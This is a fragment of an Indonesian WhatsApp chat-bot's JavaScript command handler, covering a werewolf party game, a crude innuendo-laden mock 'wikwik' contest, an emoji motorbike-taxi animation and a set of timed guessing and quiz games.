				}
			} else if (ww[chat].player[i].role === "seer") {
				if (ww[chat].player[i].isdead != true) {
					let texxt = `Hai ${Line.getName(ww[chat].player[i].id)} Kamu telah terpilih untuk menjadi *Penerawang* ${emoji_role("seer")}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;
					await Line.sendMessage(ww[chat].player[i].id, {
						text: texxt,
						mentions: player,
					});
				}
			} else if (ww[chat].player[i].role === "guardian") {
				if (ww[chat].player[i].isdead != true) {
					let teext = `Hai ${Line.getName(ww[chat].player[i].id)} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role("guardian")}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
					await Line.sendMessage(ww[chat].player[i].id, {
						text: teext,
						mentions: player,
					});
				}
			} else if (ww[chat].player[i].role === "sorcerer") {
				if (ww[chat].player[i].isdead != true) {
					let textu = `Hai ${Line.getName(ww[chat].player[i].id)} Kamu terpilih sebagai Penyihir ${emoji_role("sorcerer")}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;
					await Line.sendMessage(ww[chat].player[i].id, {
						text: textu,
						mentions: player,
					});
				}
			}
		}
		await Line.sendMessage(m.chat, {
			text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
			contextInfo: {
				externalAdReply: {
					title: "W E R E W O L F",
					mediaType: 1,
					renderLargerThumbnail: true,
					thumbnail: await resize(thumb, 300, 175),
					sourceUrl: "https://whatsapp.com/channel/0029Vaf0HPMLdQeZsp3XRp2T",
					mediaUrl: thumb,
				},
				mentionedJid: player,
			},
		});
		await run(vioo, chat, ww);
	} else if (value === "kill") {
	    let byId = getPlayerById2(sender, parseInt(target), ww);
		if (dataPlayer(sender, ww).role !== "werewolf") return m.reply("Peran ini bukan untuk kamu");
		if (byId.db.role === "sorcerer") return m.reply("Tidak bisa menggunakan skill untuk teman");
		if (playerOnGame(sender, ww) === false) return m.reply("Kamu tidak dalam sesi game")
		if (dataPlayer(sender, ww).status === true) return m.reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
		if (dataPlayer(sender, ww).isdead === true) return m.reply("Kamu sudah mati")
		if (!target || target.length < 1 || target.split('').length > 2) return m.reply(`Masukan nomor player \nContoh : \n${p_c} kill 1`)
		if (isNaN(target)) return m.reply("Gunakan hanya nomor")
		if (byId.db.isdead === true) return m.reply("Player sudah mati")
		if (byId.db.id === sender) return m.reply("Tidak bisa menggunakan skill untuk diri sendiri")
		if (byId === false) return m.reply("Player tidak terdaftar")
		reply("Berhasil membunuh player " + parseInt(target)).then(() => {
			dataPlayer(sender, ww).status = true;
			killWerewolf(sender, parseInt(target), ww);
		});
	} else if (value === "dreamy") {
		if (dataPlayer(sender, ww).role !== "seer") return m.reply("Peran ini bukan untuk kamu");
		if (playerOnGame(sender, ww) === false) return m.reply("Kamu tidak dalam sesi game")
		if (dataPlayer(sender, ww).status === true) return m.reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
		if (dataPlayer(sender, ww).isdead === true) return m.reply("Kamu sudah mati")
		if (!target || target.length < 1 || target.split('').length > 2) return m.reply(`Masukan nomor player \nContoh: ${p_c} kill 1`)
		if (isNaN(target)) return m.reply("Gunakan hanya nomor")
		let byId = getPlayerById2(sender, parseInt(target), ww)
		if (byId.db.isdead === true) return m.reply("Player sudah mati")
		if (byId.db.id === sender) return m.reply("Tidak bisa menggunakan skill untuk diri sendiri")
		if (byId === false) return m.reply("Player tidak terdaftar")
		let dreamy = dreamySeer(m.sender, parseInt(target), ww);
		reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`).then(() => {
			dataPlayer(sender, ww).status = true;
		});
	} else if (value === "deff") {
		if (dataPlayer(sender, ww).role !== "guardian") return m.reply("Peran ini bukan untuk kamu");
		if (playerOnGame(sender, ww) === false) return m.reply("Kamu tidak dalam sesi game")
		if (dataPlayer(sender, ww).status === true) return m.reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
		if (dataPlayer(sender, ww).isdead === true) return m.reply("Kamu sudah mati")
		if (!target || target.length < 1 || target.split('').length > 2) return m.reply(`Masukan nomor player \nContoh: ${p_c} kill 1`)
		if (isNaN(target)) return m.reply("Gunakan hanya nomor")
		let byId = getPlayerById2(sender, parseInt(target), ww)
		if (byId.db.isdead === true) return m.reply("Player sudah mati")
		if (byId.db.id === sender) return m.reply("Tidak bisa menggunakan skill untuk diri sendiri")
		if (byId === false) return m.reply("Player tidak terdaftar")
		reply(`Berhasil melindungi player ${target}`).then(() => {
			protectGuardian(m.sender, parseInt(target), ww);
			dataPlayer(sender, ww).status = true;
		});
	} else if (value === "sorcerer") {
		if (dataPlayer(sender, ww).role !== "sorcerer") return m.reply("Peran ini bukan untuk kamu");
		if (playerOnGame(sender, ww) === false) return m.reply("Kamu tidak dalam sesi game")
		if (dataPlayer(sender, ww).status === true) return m.reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
		if (dataPlayer(sender, ww).isdead === true) return m.reply("Kamu sudah mati")
		if (!target || target.length < 1 || target.split('').length > 2) return m.reply(`Masukan nomor player \nContoh: ${p_c} kill 1`)
		if (isNaN(target)) return m.reply("Gunakan hanya nomor")
		let byId = getPlayerById2(sender, parseInt(target), ww)
		if (byId.db.isdead === true) return m.reply("Player sudah mati")
		if (byId.db.id === sender) return m.reply("Tidak bisa menggunakan skill untuk diri sendiri")
		if (byId === false) return m.reply("Player tidak terdaftar")
		let sorker = sorcerer(sesi(m.sender), target);
		reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`).then(() => {
			dataPlayer(sender, ww).status = true;
		});
	} else if (value === "vote") {
		if (!m.isGroup) return onlyGrup()
		if (!ww[chat]) return m.reply("Belum ada sesi permainan");
		if (ww[chat].status === false) return m.reply("Sesi permainan belum dimulai");
		if (ww[chat].time !== "voting") return m.reply("Sesi voting belum dimulai");
		if (playerOnRoom(sender, chat, ww) === false) return m.reply("Kamu bukan player");
		if (dataPlayer(sender, ww).isdead === true) return m.reply("Kamu sudah mati");
		if (!target || target.length < 1) return m.reply("Masukan nomor player");
		if (isNaN(target)) return m.reply("Gunakan hanya nomor");
		if (dataPlayer(sender, ww).isvote === true) return m.reply("Kamu sudah melakukan voting");
		b = getPlayerById(chat, sender, parseInt(target), ww);
		if (b.db.isdead === true) return m.reply(`Player ${target} sudah mati.`);
		if (ww[chat].player.length < parseInt(target)) return m.reply("Invalid");
		if (getPlayerById(chat, sender, parseInt(target), ww) === false) return m.reply("Player tidak terdaftar!");
		vote(chat, parseInt(target), sender, ww);
		return m.reply("Vote ✓");
	} else if (value == "exit") {
		if (!m.isGroup) return onlyGrup()
		if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
		if (playerOnRoom(sender, chat, ww) === false) return m.reply("Kamu tidak dalam sesi permainan");
		if (ww[chat].status === true) return m.reply("Permainan sudah dimulai, kamu tidak bisa keluar");
		let exitww = `${sender.split("@")[0]} Keluar dari permainan`
		Line.sendMessage(m.chat, {
			text: exitww,
			contextInfo: {
				externalAdReply: {
					title: "W E R E W O L F",
					mediaType: 1,
					renderLargerThumbnail: true,
					thumbnail: await resize(thumb, 300, 175),
					sourceUrl: "https://whatsapp.com/channel/0029Vaf0HPMLdQeZsp3XRp2T",
					mediaUrl: thumb,
				},
				mentionedJid: sender,
			},
		}, {
			quoted: m
		});
		playerExit(chat, sender, ww);
	} else if (value === "delete") {
		if (!m.isGroup) return onlyGrup()
		if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
		if (ww[chat].owner !== sender) return m.reply(`Hanya @${ww[chat].owner.split("@")[0]} yang dapat menghapus sesi permainan ini`);
		reply("Sesi permainan berhasil dihapus").then(() => {
			delete ww[chat];
		});
	} else if (value === "player") {
		if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
		if (playerOnRoom(sender, chat, ww) === false) return m.reply("Kamu tidak dalam sesi permainan");
		if (ww[chat].player.length === 0) return m.reply("Sesi permainan belum memiliki player");
		let player = [];
		let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
		for (let i = 0; i < ww[chat].player.length; i++) {
			text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")} ${ww[chat].player[i].isdead === true ? `☠️ ${ww[chat].player[i].role}` : ""}\n`;
			player.push(ww[chat].player[i].id);
		}
		Line.sendMessage(m.chat, {
			text: text,
			contextInfo: {
				externalAdReply: {
					title: "W E R E W O L F",
					mediaType: 1,
					renderLargerThumbnail: true,
					thumbnail: await resize(thumb, 300, 175),
					sourceUrl: "https://whatsapp.com/channel/0029Vaf0HPMLdQeZsp3XRp2T",
					mediaUrl: thumb,
				},
				mentionedJid: player,
			},
		}, {
			quoted: m
		});
	} else {
		let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
		text += ` • ww create\n`;
		text += ` • ww join\n`;
		text += ` • ww start\n`;
		text += ` • ww exit\n`;
		text += ` • ww delete\n`;
		text += ` • ww player\n`;
		text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
		Line.sendMessage(m.chat, {
			text: text.trim(),
			contextInfo: {
				externalAdReply: {
					title: "W E R E W O L F",
					mediaType: 1,
					renderLargerThumbnail: true,
					thumbnail: await resize(thumb, 300, 175),
					sourceUrl: web,
					mediaUrl: thumb,
				},
			},
		}, {
			quoted: m
		});
	}
}
break

case 'wikwik': {
if (!q) return m.reply(`Contoh: ${prefix+command} ayu`)
const argsLower = args.map(arg => arg.toLowerCase());
const petarung1 = argsLower[0];
const petarung2 = argsLower[1];
const totalRounds = 8;
let ronde = 1;
let nyawaPetarung1 = 200;
let nyawaPetarung2 = 200;

let result = `🫶 Wikwik antara ${db.data.users[m.sender].nama} dan ${args[0]} dimulai! 🫦\n\n`;

while (ronde <= totalRounds && nyawaPetarung1 > 0 && nyawaPetarung2 > 0) {
const pukulan = [
'ajul gedang', 'gaya marmot', 'gaya roket', 'gaya kucing', 'gaya katak'];

const pilihanPetarung1 = pukulan[Math.floor(Math.random() * pukulan.length)];
const pilihanPetarung2 = pukulan[Math.floor(Math.random() * pukulan.length)];

const damagePetarung1 = Math.floor(Math.random() * 50) + 1;
const damagePetarung2 = Math.floor(Math.random() * 50) + 1;

result += `🫦💦 Ronde ${ronde}\n`;
result += `${db.data.users[m.sender].nama} stamina: ${nyawaPetarung1}\n`;
result += `${args[0]} stamina: ${nyawaPetarung2}\n`;
result += `${db.data.users[m.sender].nama}: ${pilihanPetarung1}\n`;
result += `${args[0]}: ${pilihanPetarung2}\n\n`;

if (pilihanPetarung1 === pilihanPetarung2) {
result += `⚔️ Wikwik sedang berlangsung melakukan gaya yang sama! blom ada yang keluar sama sekali.\n`;
} else {
result += `💦 ${db.data.users[m.sender].nama} melakukan ${pilihanPetarung1} dan ${args[0]} melakukan ${pilihanPetarung2}!\n`;
nyawaPetarung1 -= pilihanPetarung2 === 'jab' ? damagePetarung1 : damagePetarung1 + 10;
nyawaPetarung2 -= pilihanPetarung1 === 'jab' ? damagePetarung2 : damagePetarung2 + 10;
result += `💔 ${db.data.users[m.sender].nama} menerima jilmek ${nyawaPetarung1 >= 0 ? damagePetarung1 : 0}!\n`;
result += `💔 ${args[0]} menerima spong ${nyawaPetarung2 >= 0 ? damagePetarung2 : 0}!\n\n--------------------------------------------------\n`;
}

ronde++;
}

result += `\n⏱️ Wikwik akhirnya berakhir!\n`;
result += `${db.data.users[m.sender].nama} stamina akhir: ${nyawaPetarung1}\n`;
result += `${args[0]} stamina akhir: ${nyawaPetarung2}\n`;

if (nyawaPetarung1 > nyawaPetarung2) {
result += `👙 ${db.data.users[m.sender].nama} memenangkan pertandingan dengan keluar cairan yang lebih banyak!\n`;
} else if (nyawaPetarung2 > nyawaPetarung1) {
result += `🩲 ${args[0]} memenangkan pertandingan dengan keluar cairan yang lebih banyak!\n`;
} else {
result += `👙💦 Pertandingan berakhir imbang! Kedua yang wikwik memiliki stamina yang sama.\n`;
}

await m.reply(`${result}`);
}
break

case 'ngojek':
case 'ojek': {
if (!text) return m.reply(`Contoh: ${prefix+command} lampung|Jakarta\n\n*PENJELASAN*\n${prefix+command} <dari>|<tujuan> / Lampung ke Jakarta`)
const san = args.join(" ")
const jay = san.split("|")[0];
const ya = san.split("|")[1];
if (!jay) return !0 //malas
if (!ya) return !0 //nye
let hah = ["Udin", "Yono", "Agus", "Asep", "Yanto", "Ahmad", "Riski", "Ridho", "Egy", "Pegi", "Rehan", "Yanti", "Putri", "Rahma", "Ica", "Caca", "Ayu", "Rini", "Lani", "Cika", "Nisa", "Alya", "Fikri", "Edo", "Angga", "Putra", "Yahya", "Fahri", "Fadil", "Aldo", "Resky", "Bela", "Kiki", "Zaki", "Reza", "Kak gem", "Uni bakwan"]
let orgnya = hah[Math.floor(Math.random() * hah.length)]
let tmpan = `${ya}
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️⬛⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
⬛⬜👤⬜⬜⬜⬜⬜⬅️🏍️⬜⬜⬜⬛
⬛🌳🏠⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
${jay}

*INFORMASI*
Lokasi awal: ${jay}
Lokasi tujuan: ${ya}

${orgnya}: 👤 (penumpang)
Ojek: 🏍️ ${db.data.users[m.sender].nama}
Status: Ojek sedang diperjalanan`
//==============
let bgt = `${ya}
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️⬛⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
⬛⬜⬜⬜⬜🏍️➡️⬜⬜⬜⬜⬜⬜⬛
⬛🌳🏠⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
${jay}

*INFORMASI*
Lokasi awal: ${jay}
Lokasi tujuan: ${ya}

${orgnya}: 👤 (penumpang)
Ojek: 🏍️ ${db.data.users[m.sender].nama}
Status: Mau ke lokasi tujuan (${randomNomor(17, 22)}%)`
//===============
let njir = `${ya}
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️⬛⬆️⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🏍️⬜⬛
⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛🌳🏠⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
${jay}

*INFORMASI*
Lokasi awal: ${jay}
Lokasi tujuan: ${ya}

${orgnya}: 👤 (penumpang)
Ojek: 🏍️ ${db.data.users[m.sender].nama}
Status: Mau ke lokasi tujuan (${randomNomor(50, 57)}%)`
//==============
let lah = `${ya}
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜👤🏍️⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️⬛⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛🌳🏠⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
${jay}

*INFORMASI*
Lokasi awal: ${jay}
Lokasi tujuan: ${ya}
Status: Sampai ke tujuan`
//===============
let ong = randomNomor(500, 1000)
let tai = `*BERHASIL NGOJEK*

Informasi penumpang
Nama: ${orgnya}
Ongkos: ${toRupiah(ong)}

Pendapatan Ngojek
Nama: ${db.data.users[m.sender].nama}
Money: ${toRupiah(ong)}`
addLimit(m.sender, ong)
edit5(tmpan, bgt, njir, lah, tai)
}
break

case 'tebakgambar': {
if (from in tebakgambar) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebakgambar.json')));
console.log('Jawaban: '+jawaban)
var teks1 = `*GAME TEBAK GAMBAR*\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`
await Line.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: m})
tebakgambar[from] = {
soal: img,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakgambar[from]) m.reply(`*WAKTU HABIS!*\nJawaban: ${tebakgambar[from].jawaban}`);
delete tebakgambar[from];
}, gamewaktu * 1000)
}}
break

case 'tebakkalimat': {
if (from in tebakkalimat) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebakkalimat.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME TEBAK KALIMAT*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
tebakkalimat[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkalimat[from]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal: ${soal}\n\nAdalah: ${jawaban}`);
delete tebakkalimat[from];
}, gamewaktu * 1000)
}}
break

case 'tebakkata': {
if (from in tebakkata) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebakkata.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME TEBAK KATA*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
tebakkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkata[from]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal: ${soal}\n\nAdalah: ${jawaban}`);
delete tebakkata[from];
}, gamewaktu * 1000)
}}
break

case 'tebaklirik': {
if (from in tebaklirik) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebaklirik.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME TEBAK LIRIK*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
tebaklirik[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklirik[from]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal:\n${soal}\n\nAdalah: ${jawaban}`);
delete tebaklirik[from];
}, gamewaktu * 1000)
}}
break

case 'tebakanime': {
if (from in tebakanime) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { image, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebakanime.json')));
console.log('Jawaban: '+jawaban)
var teks1 = `*GAME TEBAK ANIME*\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`
await Line.sendMessage(from, {image: {url: image}, caption: teks1}, {quoted: m})
tebakanime[m.chat] = {
soal: image,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakanime[m.chat]) m.reply(`*WAKTU HABIS!*\nJawaban: ${tebakanime[m.chat].jawaban}`);
delete tebakanime[m.chat];
}, gamewaktu * 1000)
}}
break

case 'tebaklagu': {
if (from in tebaklagu) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, artis, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebaklagu.json')));
console.log('Jawaban: '+jawaban)
if (jawaban.toLowerCase() == 'Audio tidak ditemukan, silahkan request ulang!') return m.reply('Terjadi kesalahan')
var teks1 = `*GAME TEBAK LAGU*\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nArtis: ${artis}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`
Line.sendMessage(from, {audio: {url: soal}, mimetype: 'audio/mpeg', ptt: true}, {quoted: m})
await Line.sendMessage(from, {text: teks1}, {quoted:m})
tebaklagu[m.chat] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklagu[m.chat]) m.reply(`*WAKTU HABIS!*\nJawaban: ${tebaklagu[m.chat].jawaban}`);
delete tebaklagu[m.chat];
}, gamewaktu * 1000)
}}
break

case 'kuis': {
if (from in kuis) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/kuis.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME KUIS*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
kuis[m.chat] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (kuis[m.chat]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal:\n${soal}\n\nAdalah: ${jawaban}`);
delete kuis[m.chat];
}, gamewaktu * 1000)
}}
break

case 'tebakkimia': {
if (from in tebakkimia) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebakkimia.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME TEBAK KIMIA*\nSoal: ${soal}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
tebakkimia[m.chat] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkimia[m.chat]) m.reply(`*WAKTU HABIS!*\nNama unsur dari lambang ${soal}\n\nAdalah: ${jawaban}`)
delete tebakkimia[m.chat];
}, gamewaktu * 1000)
}}
break

case 'tebakbendera': {
if (from in tebakbendera) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebakbendera.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME TEBAK BENDERA*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
tebakbendera[m.chat] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakbendera[m.chat]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal:\n${soal}\n\nAdalah: ${jawaban}`);
delete tebakbendera[m.chat];
}, gamewaktu * 1000)
}}
break

case 'siapakahaku': {
if (from in siapakahaku) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/siapakahaku.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME SIAPAKAH AKU*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
siapakahaku[m.chat] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (siapakahaku[m.chat]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal:\n${soal}\n\nAdalah: ${jawaban}`);
delete siapakahaku[m.chat];
}, gamewaktu * 1000)
}}
break

case 'asahotak': {
if (from in asahotak) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/asahotak.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME ASAH OTAK*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
asahotak[m.chat] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (asahotak[m.chat]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal:\n${soal}\n\nAdalah: ${jawaban}`);
delete asahotak[m.chat];
}, gamewaktu * 1000)
}}
break

case 'susunkata': {
if (from in susunkata) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/susunkata.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME SUSUN KATA*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
susunkata[m.chat] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (susunkata[m.chat]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal:\n${soal}\n\nAdalah: ${jawaban}`);
delete susunkata[m.chat];
}, gamewaktu * 1000)
}}
break

case 'caklontong': {
if (from in caklontong) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/caklontong.json')));
console.log(`Jawaban: ${jawaban}\n${deskripsi}`)
await m.reply(`*GAME CAK LONTONG*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
caklontong[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (caklontong[from]) m.reply(`*WAKTU HABIS!*\nJawaban: ${jawaban}\n${deskripsi}`)
delete caklontong[from];
}, gamewaktu * 1000)
}}
break

case 'math': 
case 'kuismath': {
if (from in kuismath) return m.reply('Masih ada sesi yang belum diselesaikan!');
let { genMath, modes } = require('./lib/game/math')
if (!q) return m.reply( `*MODE*\n• ${Object.keys(modes).join('\n• ')}\n\nContoh: ${prefix+command} easy`)
if (!(Object.keys(modes)).includes(args[0])) return m.reply('Silahkan pilih modenya yang benar!')
var { soal, jawaban, waktu, hadiah } = await genMath(q.toLowerCase()).catch((err) => m.reply('Silahkan pilih modenya yang benar!'))
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME KUIS MATH*\nSoal: Berapa hasil dari ${soal.toLowerCase()}\nWaktu: ${waktu / 1000} detik\n\nKetik .nyerah untuk menyerah`)
kuismath[from] = {
soal: soal,
jawaban: jawaban,
hadiah: randomNomor(2000, hadiah),
waktu: setTimeout(function () {
if (kuismath[from]) m.reply(`*WAKTU HABIS!*\nJawaban: ${jawaban}`)
delete kuismath[from];
}, waktu)
}}
break

case 'tebakgame': {
let anu = await fetchJson('https://raw.githubusercontent.com/qisyana/scrape/main/tebakgame.json')
let result = anu[Math.floor(Math.random() * anu.length)]
tebakgame[m.chat] = [
